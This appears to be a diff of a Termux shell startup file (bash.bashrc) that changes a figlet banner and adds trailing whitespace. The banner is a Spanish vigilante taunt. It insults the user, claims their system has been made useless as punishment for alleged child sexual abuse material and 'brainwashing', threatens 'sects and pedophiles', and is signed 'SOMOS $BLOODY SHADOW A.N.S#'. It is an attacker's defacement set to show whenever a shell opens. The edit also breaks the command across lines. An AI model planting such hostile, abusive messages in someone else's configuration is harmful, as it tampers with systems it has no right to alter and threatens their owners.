@@ -3,11 +3,13 @@ if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
                 /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
         }
 fi
-
+                                                                                                                                          
 PS1='\$ '
 
 echo "==================================================================================================================================="
 
-figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te lo mereces hijo de puta. Asi aprenderas a  no almacenar pornografia infantil en tu ordenador. Ni tampoco a lavar el recebro de la gente inocente. Sectas y pedofilos, vais a terminar muy mal....
-
-echo "==================================================================================================================================="
+figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te lo mereces hijo de puta. Asi aprenderas a  no almacenar
+pornografia infantil en tu ordenador. Ni tampoco a lavar el cerebro de la gente inocente. Sectas y pedofilos, vais a terminar muy mal....
+SOMOS $BLOODY SHADOW A.N.S#
+   
+echo "==================================================================================================================================="  
